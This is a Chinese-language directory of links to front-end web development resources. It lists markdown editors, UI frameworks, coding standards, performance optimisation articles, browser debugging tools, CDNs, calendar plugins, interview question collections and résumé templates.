一款国内的在线markdown编辑器 stackedit https://stackedit.io 国外的在线markdown编辑器，功能强大，同步云盘 mditor http://bh-lay.github.io/mditor 一款轻量级的markdown编辑器 lepture-editor https://github.com/lepture/editor markdown-editor https://github.com/jbt/markdown-editor 作业部落 https://www.zybuluo.com 功能强大，速度流畅，全平台同步 兼容性 兼容性 地址 esma 兼容列表 http://kangax.github.io/compat-table/es6 W3C CSS验证服务 http://jigsaw.w3.org/css-validator/validator.html.zh-cn caniuse http://caniuse.com/#index csscreator http://csscreator.com/properties microsoft https://msdn.microsoft.com/zh-cn/library/cc351024(v=vs.85.aspx 在线测兼容-移动端 http://www.responsinator.com emulators https://www.manymo.com/emulators UI相关 UI相关 地址 Foundation http://foundation.zurb.com/?form=jeffjade.com Bootcss http://v3.bootcss.com/?form=jeffjade.com Element UI http://element.eleme.io/#/zh-CN 基于Vue ANT DESIGN http://ant.design 一个 UI 设计语言 Smart UI http://smartui.chinamzz.com MetroUICSS http://www.w3cplus.com/MetroUICSS Semantic http://semantic-ui.com Layui http://www.layui.com/?form=jeffjade.com Buttons http://alexwolfe.github.io/Buttons kitecss http://hiloki.github.io/kitecss pintuer http://www.pintuer.com amazeui http://amazeui.org worldhello http://www.worldhello.net/gotgithub/index.html linuxtoy http://igit.linuxtoy.org/contents.html gitmagic http://www-cs-students.stanford.edu/~blynn/gitmagic/intl/zh_cn rogerdudler http://rogerdudler.github.io/git-guide/index.zh.html gitref http://gitref.justjavac.com book http://git-scm.com/book/zh gogojimmy http://gogojimmy.net/2012/01/17/how-to-use-git-1-git-basic 其它API 其它API 地址 HTTP API 设计指南 http://segmentfault.com/bookmark/1230000002521721 javascript流行库汇总 javascriptoo 验证api http://niceue.com/validator/demo/index.php underscore 中文手册 http://www.css88.com/doc/underscore underscore源码分析 http://www.html-js.com/article/Underscorejs-source-code-analysis-of-underscorejs-source-code-analysis%203031 underscore源码分析-亚里士朱德的博客 http://yalishizhude.github.io/tags/underscore underscrejs en api http://underscorejs.org lodash - underscore的代替品 https://lodash.com ext4api http://extjs-doc-cn.github.io/ext4api qwrap手册 http://dev.qwrap.com/resource/js/_docs/_youa/#/qw/base/loadJs_.htm 缓动函数 http://easings.net/zh-cn svg 中文参考 http://www.w3school.com.cn/svg/svg_reference.asp svg mdn参考 https://developer.mozilla.org/en-US/docs/Web/SVG svg 导出 canvas https://github.com/gabelerner/canvg svg 导出 png https://github.com/exupero/saveSvgAsPng ai-to-svg http://www.zamzar.com/convert/ai-to-svg localStorage 库 https://github.com/machao/localStorage 图表类 图表类 地址 Highcharts 中文API http://www.hcharts.cn/api/index.php Highcharts 英文API http://api.highcharts.com/highcharts ECharts 百度的图表软件 http://echarts.baidu.com/ 高德地图 http://lbs.amap.com/api 开源的矢量图脚本框架 http://paperjs.org svg 地图 http://jvectormap.com 正则 正则 地址 JS正则表达式元字符 http://segmentfault.com/a/1190000002471140 正则表达式30分钟入门教程 http://deerchao.net/tutorials/regex/regex.htm MDN-正则表达式 https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions ruanyifeng - RegExp对象 http://javascript.ruanyifeng.com/stdlib/regexp.html 小胡子哥 - 进阶正则表达式 http://div.io/topic/764?page=1 is.js https://github.com/Cedriking/is.js/blob/master/is.js 正则在线测试 http://regexper.com 前端规范 前端规范 地址 通过分析github代码库总结出来的工程师代码书写习惯 http://alloyteam.github.io/CodeGuide HTML&amp;CSS编码规范 by @mdo http://codeguide.bootcss.com 团队合作的css命名规范-腾讯AlloyTeam前端团队 http://www.alloyteam.com/2011/10/css-on-team-naming/ 前端编码规范之js - by yuwenhui http://yuwenhui.github.io 前端编码规范之js - by 李靖 http://www.cnblogs.com/hustskyking/p/javascript-spec.html 前端开发规范手册 http://zhibimo.com/read/Ashu/front-end-style-guide Airbnb JavaScript 编码规范（简体中文版） https://github.com/yuche/javascript#table-of-contents AMD与CMD规范的区别 http://www.zhihu.com/question/20351507 AMD与CMD规范的区别 http://www.cnblogs.com/tugenhua0707/p/3507957.html KISSY 源码规范 http://docs.kissyui.com/1.4/docs/html/tutorials/style-guide/kissy-source-style.html bt编码规范 http://codeguide.bootcss.com 规范加强版 https://github.com/Suxiaogang/Code_Guide 前端代码规范 及 最佳实践 http://blog.jobbole.com/79075 百度前端规范 http://coderlmn.github.io/code-standards 百度前端规范 http://isobar-idev.github.io/code-standards 百度前端规范 http://zhuanlan.zhihu.com/fuyun/19884834 ECMAScript6 编码规范–广发证券前端团队 https://github.com/gf-rd/es6-coding-style JavaScript 风格指南/编码规范（Airbnb公司版） http://blog.jobbole.com/79484 网易前端开发规范 http://nec.netease.com/standard css模块 http://www.75team.com/archives/1049 前端规范资源列表 https://github.com/ecomfe/spec PHP PHP 地址 最流行的PHP 代码规范 http://segmentfault.com/a/1190000000443795 最流行的PHP 代码规范 https://github.com/hfcorriez/fig-standards/blob/zh_CN/%E6%8E%A5%E5%8F%97/PSR-2-coding-style-guide.md 各大公司开源项目 各大公司开源项目 地址 Facebook Projects https://code.facebook.com/projects/web 百度web前端研发部 http://fex.baidu.com 百度EFE http://efe.baidu.com 百度github https://github.com/fex-team alloyteam http://www.alloyteam.com alloyteam-github http://alloyteam.github.io alloyteam-AlloyGameEngine https://github.com/AlloyTeam/AlloyGameEngine AlloyDesigner http://alloyteam.github.io/AlloyDesigner 即时修改，即时保存，设计稿较正，其它开发辅助工具 H5交互页编辑器AEditor介绍 http://www.alloyteam.com/2015/06/h5-jiao-hu-ye-bian-ji-qi-aeditor-jie-shao H5动画交互页开发的工具介绍 AEditor http://aeditor.alloyteam.com H5动画交互页开发的工具 值得订阅的weekly https://github.com/fenbility/weekly-feed 奇舞团开源项目 http://75team.github.io Qunar UED http://ued.qunar.com 常用 常用 地址 ieBetter.js-让IE6-IE8拥有IE9+,Chrome等浏览器特性 http://www.zhangxinxu.com/wordpress/2013/12/iebetter-js-make-ie6-ie8-like-modern-browser-ie9-chrome 模拟键盘 http://mottie.github.io/Keyboard 拼音 https://github.com/hotoo/pinyin 中国个人身份证号验证 https://github.com/mc-zone/IDValidator 算法 算法 地址 数据结构与算法 JavaScript 描述. 章节练习 https://github.com/Ralph-Wang/algorithm.in.js 常见排序算法（JS版） https://github.com/twobin/twobinSort 经典排序 https://github.com/luofei2011/jsAgm/blob/master/js/sort.js 常见排序算法-js版本 https://github.com/hechangmin/jssort JavaScript 算法与数据结构 精华集 https://github.com/lightningtgc/JavaScript-Algorithms 面试常考算法题精讲 http://www.nowcoder.com/live/courses 移动端 移动端 地址 fastclick https://github.com/ftlabs/fastclick no-click-delay https://github.com/mmastrac/jquery-noclickdelay 【敏捷开发】Android团队开发规范 http://www.cnblogs.com/lcw/p/3619181.html Android 开发规范与应用 http://www.jianshu.com/p/4390f4fe19b3 ionic https://github.com/ychow/ionic-guide JSON JSON 地址 模拟生成JSON数据 http://beta.json-generator.com 焦点图 焦点图 地址 myfocus https://github.com/koen301/myfocus myfocus-官方演示站 http://www.chhua.com/myfocus SuperSlidev2.1 – 大话主席 http://www.superslide2.com soChange http://www.bujichong.com/sojs/soChange/index.html Ext, EasyUI, J-UI 及其它各种UI方案 Ext, EasyUI, J-UI 及其它各种UI方案 地址 雅虎UI - CSS UI http://developer.yahoo.com/yui/grids extjs https://www.sencha.com/products/extjs ext4英文api http://docs.sencha.com/extjs/4.0.7 ext4中文api http://extjs-doc-cn.github.io/ext4api jquery easyui 未压缩源代码 http://jquery-easyui.googlecode.com/svn/trunk/src J-UI http://jui.org MUI-最接近原生APP体验的高性能前端框架 http://dcloudio.github.io/mui Amaze UI(中国首个开源 HTML5 跨屏前端框架) http://amazeui.org 淘宝 HTML5 前端框架 http://m.sui.taobao.org KISSY - 阿里前端JavaScript库 http://docs.kissyui.com 网易Nej - Nice Easy Javascript http://nej.netease.com Kendo UI MVVM Demo http://demos.telerik.com/kendo-ui/mvvm/index 页面 社会化 分享功能 页面 社会化 分享功能 地址 百度分享 http://share.baidu.com pc端 JiaThis http://jiathis.com pc端 社会化分享组件 http://developer.baidu.com/soc/share 移动端 ShareSDK 轻松实现社会化功能 http://www.mob.com/#/index 移动端 友盟分享 http://dev.umeng.com/social/android/quick-integration 移动端 富文本编辑器 富文本编辑器 地址 功能齐全 tinymce https://www.tinymce.com 百度 ueditor http://ueditor.baidu.com/website 经典的ckeditor http://ckeditor.com 经典的kindeditor http://kindeditor.net wysiwyg http://www.bootcss.com/p/bootstrap-wysiwyg 一个有情怀的编辑器。Bach’s Editor http://integ.github.io/BachEditor tower用的编辑器 https://github.com/mycolorway/simditor summernote 编辑器 https://github.com/summernote/summernote html5编辑器 http://neilj.github.io/Squire Quilljs编辑器 http://quilljs.com wangEditor https://github.com/wangfupeng1988/wangEditor 前端概述 前端概述 地址 前端工具大全 http://www.awesomes.cn 什么是前端工程化 https://github.com/fouber/blog/issues/10?from=timeline&amp;isappinstalled=0# [译] 前端攻略-从路人甲到英雄无敌 https://segmentfault.com/a/1190000005174755 pc图轮 pc图轮 地址 Vue 的图片轮播组件:vue-slider https://github.com/qusiba/vue-slider 左右按钮多图切换 http://bxslider.com/examples/carousel-demystified fullpage全屏轮播 https://github.com/alvarotrigo/fullPage.js 移动端图轮 移动端图轮 地址 滑屏效果 http://www.idangero.us/swiper 全屏fullpage https://github.com/peunzhang/fullpage 单个图片切换 https://github.com/qiqiboy/touchslider 单个全屏切换 https://github.com/peunzhang/slip.js 单个全屏切换 https://github.com/peunzhang/iSlider 滑屏效果 https://github.com/saw/touch-interfaces 旋转拖动设置 http://baijs.com/tinycircleslider 类似于swipe切换 http://touchslider.com 支持多种形式的触摸滑动 http://www.swiper.com.cn/demo/index.html 滑屏效果 https://github.com/joker-ye/main/blob/master/wap/index.html 大话主席pc移动图片轮换 http://www.superslide2.com 滑屏效果 https://github.com/hahnzhu/parallax.js 基于zepto的fullpage https://github.com/yanhaijing/zepto.fullpage [WebApp]定宽网页设计下，固定宽度布局开发WebApp并实现多终端下WebApp布局自适应 http://www.cnblogs.com/plums/archive/2013/01/10/WebApp-fixed-width-layout-of-multi-terminal-adapter-since.html 判断微信客户端的那些坑 http://loo2k.com/blog/detecting-wechat-client 可以通过javascript直接调用原生分享的工具 https://github.com/JefferyWang/nativeShare.js JiaThis 分享到微信代码 http://www.jiathis.com/help/html/weixin-share-code 聊聊移动端跨平台开发的各种技术 http://fex.baidu.com/blog/2015/05/cross-mobile 前端自动化测试 http://www.zhihu.com/question/29922082 多种轮换图片 http://ajccom.github.io/niceslider 滑动侧边栏 https://mango.github.io/slideout 文件上传 文件上传 地址 百度上传组件 http://fex.baidu.com/webuploader 上传 https://blueimp.github.io/jQuery-File-Upload flash 头像上传 http://www.hdfu.net 图片上传预览 http://www.dropzonejs.com 图片裁剪 http://elemefe.github.io/image-cropper 图片裁剪-shearphoto http://www.shearphoto.com jQuery图片处理 http://www.oschina.net/project/tag/284/jquery-image-tools?lang=0&amp;os=0&amp;sort=view&amp;p=2 模拟select 模拟select 地址 糖饼 select http://aui.github.io/popupjs/doc/selectbox.html flexselect https://github.com/rmm5t/jquery-flexselect 双select http://loudev.com select2 http://select2.github.io 取色插件 取色插件 地址 类似 Photoshop 的界面取色插件 http://www.jq22.com/plugin/367 jquery color https://github.com/jquery/jquery-color 取色插件集合 http://www.oschina.net/project/tag/287/color-picker farbtastic 圆环＋正方形 https://github.com/mattfarina/farbtastic 城市联动 城市联动 地址 jquery.cityselect.js基于jQuery+JSON的省市或自定义联动效果 http://www.ijquery.cn/?p=360 剪贴板 剪贴板 地址 剪贴板 https://github.com/zeroclipboard/zeroclipboard clipboard 最新的剪切方案 http://zenorocha.github.io/clipboard.js 不是Flash的剪贴板 https://github.com/zenorocha/clipboard.js 简繁转换 简繁转换 地址 简繁转换 https://github.com/BYVoid/OpenCC 表格 Grid 表格 Grid 地址 facebook表格 http://facebook.github.io/fixed-data-table 类似于Excel编辑表格-handsontable http://handsontable.com bootstrap-table插件 http://bootstrap-table.wenzhixin.net.cn datatables https://www.datatables.net 在线演示 在线演示 地址 js 在线编辑 - runjs http://runjs.cn js 在线编辑 - jsbin http://jsbin.com js 在线编辑 - codepen http://codepen.io js 在线编辑 - jsfiddle http://jsfiddle.net java 在线编辑 - runjs http://ideone.com js 在线编辑 - hcharts http://code.hcharts.cn js 在线编辑 - jsdm http://jsdm.com sql 在线编辑 - sqlfiddle http://sqlfiddle.com mozilla 在线编辑器 https://thimble.mozilla.org 常规优化 常规优化 地址 Javascript高性能动画与页面渲染 http://www.infoq.com/cn/articles/javascript-high-performance-animation-and-page-rendering 移动H5前端性能优化指南 http://isux.tencent.com/h5-performance.html 5173首页前端性能优化实践 http://ued.5173.com/?p=1731 给网页设计师和前端开发者看的前端性能优化 http://www.uisdc.com/front-end-performance-for-web-designers-and-front-end-developers 复杂应用的 CSS 性能分析和优化建议 http://www.orzpoint.com/profiling-css-and-optimization-notes 张鑫旭——前端性能 张鑫旭——前端性能 前端性能监控总结 http://www.xiaoqiang.org/javascript/font-end-performance-monitor.html 网站性能优化之CSS无图片技术 网站性能优化之CSS无图片技术 web前端性能优化进阶路 web前端性能优化进阶路 前端技术：网站性能优化之CSS无图片技术 http://my.eoe.cn/tuwandou/archive/4544.html 浏览器的加载与页面性能优化 http://www.baiduux.com/blog/2011/02/15/browser-loading 页面加载中的图片性能优化 http://www.w3ctech.com/p/1503 Hey——前端性能 Hey——前端性能 html优化 html优化 99css——性能 99css——性能 YSLOW中文介绍 http://www.cnblogs.com/yslow 转一篇Yahoo关于网站性能优化的文章，兼谈本站要做的优化 http://www.360ito.com/article/40.html Yahoo!团队实践分享：网站性能 http://www.360doc.com/content/10/0928/09/2588264_56971287.shtml 网站性能优化指南：什么使我们的网站变慢？ http://blog.jiasule.com/i/153 网站性能优化实践，减少加载时间，提高用户体验 http://www.powereasy.net/helpyou/knowledge/ecommerce/9593.html 前端重构实践之如何对网站性能优化？ http://www.adinnet.cn/blog/designview/2012-7-12/678.html 前端性能优化：使用媒体查询加载指定大小的背景图片 http://www.gbin1.com/technology/javascript/20130708-front-end-performance-optimization-9 网站性能系列博文 http://www.mykuer.com/post/factors-that-affect-the-speed-of-web-site-open.html 加载，不只是少一点点 http://tgideas.qq.com/webplat/info/news_version3/804/808/811/m579/201109/41355.shtml 前端性能的测试与优化 http://mzhou.me/article/95310 分享网页加载速度优化的一些技巧？ http://www.gbin1.com/technology/html/20130217-tips-for-speed-up-page-loading web前端优化(基于Yslow http://www.tcreator.info/webSchool/website/Front-end-Opt-Yslow.html 网站性能优化工具大全 https://www.qianduan.net/website-performance-optimization-tool.html 【高性能前端1】高性能HTML http://www.alloyteam.com/2012/10/high-performance-html 【高性能前端2】高性能CSS http://www.alloyteam.com/2012/10/high-performance-css 由12306谈谈网站前端性能和后端性能优化 http://coolshell.cn/articles/6470.html AlloyTeam——前端优化 AlloyTeam——前端优化 毫秒必争，前端网页性能最佳实践 http://www.cnblogs.com/developersupport/p/3248695.html 网站性能工具Yslow的使用方法 http://blog.sina.com.cn/s/blog_6e9d2e0701017kvu.html 前端工程与性能优化（上）：静态资源版本更新与缓存 http://www.infoq.com/cn/articles/front-end-engineering-and-performance-optimization-part1 前端工程与性能优化（下）：静态资源管理与模板框架 http://www.infoq.com/cn/articles/front-end-engineering-and-performance-optimization-part2 HTTPS连接的前几毫秒发生了什么 http://blog.jobbole.com/48369 Yslow http://uicss.cn/yslow/#more-12319 Essential Web Performance Metrics — A Primer, Part 1 http://blog.smartbear.com/web-performance/essential-web-performance-metrics-a-primer-part-1 Essential Web Performance Metrics — Part 2 http://blog.smartbear.com/performance/essential-web-performance-metrics-part-2 YUISlide,针对移动设备的动画性能优化 http://jayli.github.io/blog/data/2011/12/23/yuislide.html Improving Site Performance http://joelglovier.com/improving-site-performance 让网站提速的最佳前端实践 http://segmentfault.com/a/1190000000367899 Why Website Speed is Important http://sixrevisions.com/web-development/why-website-speed-is-important Need for Speed – How to Improve your Website Performance https://www.devbridge.com/articles/need-for-speed-how-to-improve-your-website-performance 阿里无线前端性能优化指南 (Pt.1 加载期优化 https://github.com/amfe/article/issues/1 优化工具 优化工具 地址 JavaScript 性能分析新工具 OneProfile http://www.html-js.com/article/3083 JavaScript 堆内存分析新工具 OneHeap http://www.html-js.com/article/3091 在线工具 在线工具 地址 google在线工具 https://developers.google.com/speed/pagespeed/insights 阿里-免费测试服务 http://itest.aliyun.com 阿里-F2etest多浏览器兼容性测试解决方案 https://github.com/alibaba/f2etest js性能测试 http://jsperf.com 前端架构 前端架构 地址 技术架构 http://www.zhihu.com/topic/19612641 前端架构 http://saito.im/note/The-Architecture-of-F2E 如何成为前端架构师 http://www.zhihu.com/question/24092572 关于前端架构-张克军 http://hikejun.com/sharing/2010webrebuild/?file=fe-infrastructure.html 百度腾讯offer比较（腾讯游戏VS百度基础架构） http://www.zhihu.com/question/25583350 推荐作品 推荐作品 地址 winter代码片段需要翻墙 https://gist.github.com/wintercn fgm http://www.fgm.cc/learn 岑安作品集 https://github.com/hongru/hongru.github.com 当耐特demo集合 http://kmdjs.github.io 米空格 js作品 http://www.laoshu133.com/Lab myFocus http://koen301.github.io SeaJS组件库 http://panxuepeng.github.io/seajslib 颜海镜作品 http://yanhaijing.com/myProject 脚儿网作品 http://jo2.org/category/myworks javascript个人作品 http://www.cnitblog.com/yemoo/category/3107.html 妙味的雷东升游戏作品 http://bbs.miaov.com/forum.php?mod=viewthread&amp;tid=7790 javascript作品集 http://bbs.csdn.net/topics/380227212 云五笔，灰度产生生成工具 https://github.com/TooBug/works 项目主页 http://koen301.github.io 个性的作品主页 http://zaole.net ucren js demos 集 http://ucren.com/blog/demos 智能社 http://www.zhinengshe.com/works_list.html 实例陈列架 http://demos.shizuwu.cn zoye demo http://zoye.sinaapp.com/demo 平凡 http://pingfan1990.sinaapp.com jyg 游戏案例 http://www.lovewebgames.com 很多jquery插件 http://www.helloweba.com/list.html 不羁虫 - soJs 作品系列 http://www.bujichong.com/sojs/api/index.html frozenui http://frozenui.github.io/case.html 黑白棋 http://js-game.github.io/othello fromone http://yansm.github.io/fromone/index.html pazguille http://pazguille.me Html5 VideoPlayer https://github.com/zmmbreeze/DeadSimpleVideoPlayer Proton 烟花 http://a-jie.github.io/Proton/#example 简历模板 简历模板 地址 简历 http://hcy2367.github.io/resume 简历 https://github.com/hacke2/ResumeSample 马斯特 http://pinkyjie.com/resume 张秋怡 https://joyeecheung.github.io/resume/ 翁天信 http://blog.dandyweng.com/2013/07/how-my-website-was-created 动画方式的简历 http://www.webhek.com/misc/interactive-resume 组件丰富简历 http://www.linqing07.com/resume.html haorooms博客 http://www.haorooms.com/about 面试题 面试题 地址 那几个月在找工作（百度，网易游戏） http://www.nowcoder.com/discuss/3196 2014最新面试题 http://www.html-js.com/article/1743 2016校招内推 – 阿里巴巴前端 – 三面面试经历 http://www.cnblogs.com/imwtr/p/4685546.html 年后跳槽那点事：乐视+金山+360面试之行 http://www.cnblogs.com/lvdabao/p/3660707.html Interviewing a front-end developer http://blog.sourcing.io/interview-questions 拉勾网js面试题 http://www.cnblogs.com/52cik/p/js-question-lg.html 前端面试 http://www.cnblogs.com/allenxing/p/3724382.html Web开发笔试面试题 大全 http://mianshiti.diandian.com 前端开发面试题 http://segmentfault.com/a/1190000000465431 2014最新前端面试题 https://github.com/markyun/My-blog/tree/master/Front-end-Developer-Questions 百度面试 https://github.com/fex-team/interview-questions 前端工作面试问题 https://github.com/darcyclarke/Front-end-Developer-Interview-Questions/tree/master/Chinese 前端开发面试题 http://segmentfault.com/a/1190000000465431 5个经典的前端面试问题 5个经典的前端面试问题 最全前端面试问题及答案总结 http://segmentfault.com/a/1190000002562454 如何面试一名前端开发工程师？ http://www.html-js.com/article/Large-search-front-team-column%202961 史上最全 前端开发面试问题及答案整理 https://github.com/hawx1993/Front-end-Interview-questions 前端实习生面试总结 http://www.cnblogs.com/xiaoruo/p/4665163.html 史上最全 前端开发面试问题及答案整理 https://github.com/hawx1993/Front-end-Interview-questions BAT及各大互联网公司2014前端笔试面试题：JavaScript篇 http://blog.jobbole.com/78738 前端开发面试题大收集 https://github.com/paddingme/Front-end-Web-Development-Interview-Question 收集的前端面试题和答案 https://github.com/qiu-deqing/FE-interview 如何面试前端工程师 http://www.zhihu.com/question/19568008 前端开发面试题 https://github.com/markyun/My-blog/blob/master/Front-end-Developer-Questions/Questions-and-Answers/README.md 牛客网-笔试面经 http://www.nowcoder.com/discuss?type=2 iconfont iconfont 地址 中文字体 http://www.zhihu.com/question/21253343 淘宝字库 http://iconfont.cn 字体 http://mux.alimama.com/fonts 制作教程 http://iconfont.cn/help/platform.html zhangxinxu-icommon http://www.zhangxinxu.com/wordpress/?s=icomoon icommon https://icomoon.io/app 用字体在网页中画ICON图标(推荐教程 http://imooc.com/learn/243 字体压缩工具 http://font-spider.org Fiddler Fiddler 地址 Fiddler调式使用知多少(一深入研究 http://www.cnblogs.com/tugenhua0707/p/4623317.html 微信fiddle http://www.cnblogs.com/strick/p/4570006.html 微信fiddle http://gaoboy.com/article/26.html Chrome Chrome 地址 Google Chrome 官方 https://developer.chrome.com/devtools 如何更好地运用 Chrome (Google) https://jeffjade.com/2017/05/01/122-how-to-better-use-google_chrome/ Chrome - 基础 http://www.cnblogs.com/constantince/p/4565261.html Chrome - 进阶 http://www.cnblogs.com/constantince/p/4579121.html Chrome - 性能 http://www.cnblogs.com/constantince/p/4585983.html Chrome - 性能进阶 http://www.cnblogs.com/constantince/p/4607497.html Chrome - 移动 http://www.cnblogs.com/constantince/p/4624241.html Chrome - 使用技巧 http://www.cnblogs.com/liyunhua/p/4544738.html Chrome - Console控制台不完全指南 http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html Chrome - Workspace使浏览器变成IDE http://c7sky.com/chrome-devtools-workspace.html network面板 http://www.html-js.com/article/Nothing-blind%202975 chrome开发工具快捷键 http://anti-code.com/devtools-cheatsheet chrome调试工具常用功能整理 http://www.html-js.com/article/2327 Chrome 开发工具 Workspace 使用 http://www.iinterest.net/2014/05/09/chrome-dev-tool-workspace Chrome神器Vimium快捷键学习记录 http://www.cppblog.com/deercoder/archive/2011/10/22/158886.html sass调试-w3cplus http://www.w3cplus.com/sassguide/debug.html 如何更专业的使用Chrome开发者工具-w3cplus http://www.w3cplus.com/tools/how-to-use-chrome-devtools-like-a-pro.html chrome调试canvas http://sentsin.com/web/253.html chrome profiles1 https://developer.chrome.com/devtools/index chrome profiles3 http://www.oschina.net/translate/performance-optimisation-with-timeline-profiles chrome移动版调试 https://developer.chrome.com/devtools/docs/mobile-emulation chrome调试 http://ued.taobao.org/blog/2012/06/debug-with-chrome-dev-tool chrome的调试 http://www.cnblogs.com/QLeelulu/archive/2011/08/28/2156402.html chrome console 命令详解 https://developer.chrome.com/devtools/docs/commandline-api 查看事件绑定1 http://www.cnblogs.com/leonkao/p/3809655.html 查看事件绑定2 http://www.cnblogs.com/xiaoyao2011/p/3447421.html 神器——Chrome开发者工具(一 http://segmentfault.com/a/1190000000683599 奇趣百科性能优化(Chrome DevTools 中的 Timeline Profils 等工具使用介绍 https://xinranliu.me/2015-05-22-qiqu-performance chrome 开发者工具的 15 个小技巧 http://frontenddev.org/link/15-tips-of-chrome-developer-tools.html Chrome开发者工具不完全指南 http://1ke.co/course/361 Chrome 开发者工具使用技巧 http://segmentfault.com/a/1190000003882567 Firebug Firebug 地址 firebug视频教程 http://www.imooc.com/learn/137 firefox 模拟器 https://developer.mozilla.org/zh-CN/docs/Tools/WebIDE console.log 命令详解 http://www.cnblogs.com/ctriphire/p/4116207.html Firebug入门指南 http://www.ruanyifeng.com/blog/2008/06/firebug_tutorial.html Firebug控制台详解 http://www.ruanyifeng.com/blog/2011/03/firebug_console_tutorial.html 移动,微信调试 移动,微信调试 地址 浏览器端调试安卓 https://openstf.github.io 移动端前端开发调试 http://yujiangshui.com/multidevice-frontend-debug 使用 Chrome 远程调试 Android 设备 https://github.com/yujiangshui/CN-Chrome-DevTools/blob/remote-debugging/md/Use-Tools/remote-debugging.md mac移动端调试 http://plus.uc.cn/document/webapp/doc5.html mac移动端调试 http://www.mihtool.com 无线调试攻略 http://thx.github.io/mobile/debugging-in-mobile 无线调试攻略 http://yanhaijing.com/mobile/2014/12/17/web-debug-for-mobile 屌爆了,完美调试 微信webview(x5 http://www.jianshu.com/p/ccf124f1f74b 微信调试的那些事 微信调试的那些事 远程console http://jsconsole.com 微信调试工具 http://blog.qqbrowser.cc 各种真机远程调试方法汇总 https://github.com/jieyou/remote_inspect_web_on_real_device iOS Simulator iOS Simulator 地址 Simulator iOS_Simulator_Guide-Introduction iOS Simulator的介绍和使用心得 http://www.crifan.com/intro_ios_simulator_in_xcode_and_usage_summary Image img 地址 loading img http://preloaders.net/en/circular 智图-图片优化平台 http://zhitu.isux.us 在线png优化 https://tinypng.com SM.MS(图床工具～简易好用) https://sm.ms/ yutuku：极简图床 http://yotuku.cn/ Qchan图床 http://tuchuang.org/ 浏览器同步 浏览器同步 地址 puer https://github.com/leeluolee/puer liveReload http://livereload.com f5 http://getf5.com File Watchers http://geek100.com/2608 在线PPT制作 在线PPT制作 地址 nodePPT nodePPT Cleaver快速制作网页PPT http://www.jeffjade.com/2015/10/15/2015-10-16-cleaver-make-ppt/ impress.js http://www.cnblogs.com/Darren_code/archive/2013/01/04/impressjs.html PPT https://github.com/ksky521/nodePPT reveal https://github.com/hakimel/reveal.js bespoke-fx https://github.com/ebow/bespoke-fx slippy https://github.com/Seldaek/slippy 前端导航网站 前端导航网站 地址 界面清爽的前端导航 http://uxbees.com/index.html 前端导航 http://whycss.com 前端网址导航 http://www.daqianduan.com/nav 前端名录 http://sentsin.com/daohang 前端导航 http://123.jser.us 前端开发资源 http://www.css88.com/nav 前端开发仓库 - 众多效果的收集地 http://code.ciaoca.com 前端资源导航 https://github.com/jnoodle/f2e-collect F2E 前端导航 http://f2e.im/static/pages/nav/index.html 常用CDN 常用CDN 地址 新浪CDN http://lib.sinaapp.com 百度静态资源公共库 http://cdn.code.baidu.com 360网站卫士常用前端公共库CDN服务 http://libs.useso.com Bootstrap中文网开源项目免费 CDN 服务 http://www.bootcdn.cn 开放静态文件 CDN - 七牛 http://staticfile.org CDN加速 - jq22 http://www.jq22.com/cdn jQuery CDN http://code.jquery.com 微软CDN http://www.asp.net/ajax/cdn Git Git 地址 git-scm http://git-scm.com 廖雪峰-Git教程 廖雪峰-Git教程 git-for-windows https://git-for-windows.github.io GitHub 添加 SSH keys http://daemon369.github.io/git/2015/03/10/add-ssh-keys-for-github gogithub http://www.worldhello.net/gotgithub/index.html git常规命令练习 http://pcottle.github.io/learnGitBranching git的资料整理 https://github.com/xirong/my-git 我所记录的git命令（非常实用） http://www.cnblogs.com/fanfan259/p/4810517.html 企业开发git工作流模式探索部分休整 https://github.com/xirong/my-git/blob/master/git-workflow-tutorial.md GitHub 漫游指南 https://github.com/phodal/github-roam GitHub秘籍 https://github.com/tiimgreen/github-cheat-sheet/blob/master/README.zh-cn.md 使用git和github进行协同开发流程 http://livoras.com/post/28 动画方式练习git http://onlywei.github.io/explain-git-with-d3 各种日期日历 各种日期日历 地址 经典my97 http://www.my97.net/dp/demo/index.htm 强大的独立日期选择器 http://www.cnblogs.com/gbin1/archive/2012/04/16/2452105.html fullcalendar http://fullcalendar.io fullcalendar日历控件知识点集合 http://blog.csdn.net/francislaw/article/details/7740630 中文api http://blog.sina.com.cn/s/blog_9475b1c101012c5f.html 农历日历 https://github.com/zzyss86/LunarCalendar 超酷的仿百度带节日日历老黄历控件 http://www.sucaisj.com/jiaoben/date/201509/16856.html 日期格式化 http://momentjs.com 大牛日历控件 https://github.com/Johnqing/QPAYCalendar 我群某管理作品 https://github.com/Iamlars/dateMarker input按位替换-官网 http://digitalbush.com/projects/masked-input-plugin input按位替换-github https://github.com/digitalBush/jquery.maskedinput/tree/1.2.2 bootstrap-daterangepicker https://github.com/dangrossman/bootstrap-daterangepicker 国外30个插件集合 http://www.vandelaydesign.com/30-best-free-jquery-plugins JavaScript datepicker http://dbushell.com/2012/10/09/pikaday-javascript-datepicker Datepair.js http://jonthornton.github.io/Datepair.js 一个风格多样的日历 https://github.com/glad/glDatePicker 弹出层式的全日历 http://amsul.ca/pickadate.js/date jquery双日历 http://www.daterangepicker.com 大气实用jQuery手机移动端日历日期选择插件 http://www.frankdemo.cn/index.php?c=content&amp;a=show&amp;id=115 jQuery Mobile 移动开发中的日期插件Mobiscroll https://mobiscroll.com Date library Date library 地址 Datejs https://github.com/datejs/Datejs sugarjs http://sugarjs.com/api/Date 其它 其它 地址 Mock.js 是一款模拟数据生成器 http://mockjs.com 特色的HTML框架可以创建精美的iOS应用 http://framework7.taobao.org 淘宝SUI http://m.sui.taobao.org avalonjs http://avalonjs.github.io Avalon新一代UI库： OniUI http://ued.qunar.com/oniui/index.html avalon.oniui-基于avalon的组件库 https://github.com/RubyLouvre/avalon.oniui 生成二维码(草料) http://cli.im 效果类 效果类 地址 弹出层 http://www.imooc.com/learn/58 焦点图轮播特效 http://www.imooc.com/learn/18 HTML5 有哪些让你惊艳的 demo？ http://www.zhihu.com/question/24398907 弹出层 弹出层 地址 artDialog 最新版 https://github.com/aui/artDialog artDialog 文档 http://aui.github.io/artDialog/doc/index.html google code 下载地址 https://code.google.com/p/artdialog/downloads/list 贤心弹出层 http://layer.layui.com 响应式用户交互组件库 https://github.com/bh-lay/UI sweetalert-有css3动画弹出层 http://t4t5.github.io/sweetalert 优秀JavaScript项目 优秀JavaScript项目 地址 Angular和Webpack种子文件 https://github.com/AngularClass/angular2-webpack-starter Fis3面向前端的工程构建系统 https://github.com/fex-team/fis3 Fis3 DEMO https://github.com/fex-team/fis3-demo 